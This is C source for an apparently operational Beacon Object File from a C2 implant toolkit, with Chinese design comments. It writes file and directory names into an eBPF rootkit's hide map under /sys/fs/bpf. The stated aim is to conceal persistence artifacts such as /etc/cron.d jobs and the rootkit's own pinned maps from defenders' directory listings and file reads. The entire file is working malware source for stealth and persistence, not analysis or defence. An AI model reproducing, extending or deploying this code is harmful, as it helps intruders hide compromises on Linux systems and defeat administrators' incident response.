/// hide_add.c — BOF: 事后补写 hide_names（复活层 × 隐藏层联动）
///
/// 方案依据：§3.3 P0-3 / 完全体清单 G7 + D2 —— cron 文件与 /sys/fs/bpf 的
/// pin 文件**没有被 hide_names 覆盖**，复活层是裸露的。
/// （P8 起 **pin 文件改由 ebpf_load §6c 自动覆盖**；本命令对 pin 那一侧只剩
///   「换了 pin / 要补藏别的后缀」这类人工补救，主力用途是藏落地产物。）
///
/// Usage:
///   execute bof hide_add.o <pin> <name1> [name2 ...]
///
///   pin:   ebpf_load 加载时用的 pin 名（hide_names 落在 /sys/fs/bpf/<pin>_map0）
///   name…: 要隐藏的 dirent 名（文件名/目录名，**不是**路径）
///
/// 为什么需要这条命令：ebpf_load 的 <names> 参数只在**加载那一刻**生效；
/// 而复活层落地物（/etc/cron.d/<job>）与 pin 自身（/sys/fs/bpf/<pin>_*）都是
/// 加载**之后**才出现的。没有事后补写，对手一条 `ls /etc/cron.d` 就看见复活层。
///
/// 持久化 BOF 现在已经会**自己**调 AxHideNameAdd 收尾（G7 闭环），所以本命令的
/// 定位变成「手工补写 + 补救」——尤其是 **pin 名已被 hide_names 自己藏起来**的
/// 部署：那种情况下 core 的自动扫描（走 getdents）永久失效，只能靠显式 pin 走
/// 路径查找，而显式 pin 正是本命令的入参。
///
/// 边界（2026-09-16 更正，ISS-091）：目录枚举层由 hide_names 过滤
/// （getdents64）；**内容层**已由 AX_KIND_HIDE 整块抹平（P9-9.1，
/// `cat /etc/cron.d/<job>` 也拿不到）。残留边界只剩：AX_HIDE_CAP=512
/// 以上的尾部、以及未纳入 <names> 的路径。
///
/// 注：key 的构造（64 字节定长、名字在前、NUL 填充到满）已收敛到 agent core 的
/// AxHideNameAdd —— 这个格式一旦有第二份实现就会漂移，而漂移的表现是**静默不
/// 隐藏**（syscall 不报错、回执照样 [+]）。此处不再自己拼 key。

#include "bof_api.h"

#define HIDE_MAX 32          /* hide_names 的 max_entries */

/* 参数 blob 不保证 NUL 终止（最后一个字段处直接结束），任何交给 path/printf
 * 的字段都必须先拷进有终止的本地缓冲。 */
static int ax_cstr(char *dst, int cap, const char *src, int len) {
    if (!dst || cap <= 0) return 0;
    dst[0] = 0;
    if (!src || len <= 0) return 0;
    if (len > cap - 1) len = cap - 1;
    AxMemcpy(dst, src, len);
    dst[len] = 0;
    return len;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int pin_len = 0;
    char *pin = BeaconDataExtract(&parser, &pin_len);
    char pinbuf[128];
    if (ax_cstr(pinbuf, (int)sizeof(pinbuf), pin, pin_len) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] hide_add: usage: hide_add <pin> <name>...\n");
        return;
    }

    int n = 0;
    while (parser.length > 0 && n < HIDE_MAX) {
        int nl = 0;
        char *nm = BeaconDataExtract(&parser, &nl);
        char key[128];
        if (!nm || nl <= 0) break;
        if (ax_cstr(key, (int)sizeof(key), nm, nl) <= 0) break;

        /* pin 显式传入：即使 <pin>_map0 已被 hide_names 藏起来，core 仍按**路径**
         * 取得到（过滤只作用在目录枚举上）。 */
        int rc = AxHideNameAdd(pinbuf, key);
        if (rc < 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] hide_add: '%s' failed (rc=%d)%s\n",
                         key, rc,
                         rc == -2 ? " — 先跑 ebpf_load（找不到 hide_names）" : "");
            continue;
        }
        n++;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] hide_add: hidden '%s'\n", key);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] hide_add: %d name(s) -> /sys/fs/bpf/%s_map0\n",
                 n, pinbuf);
}
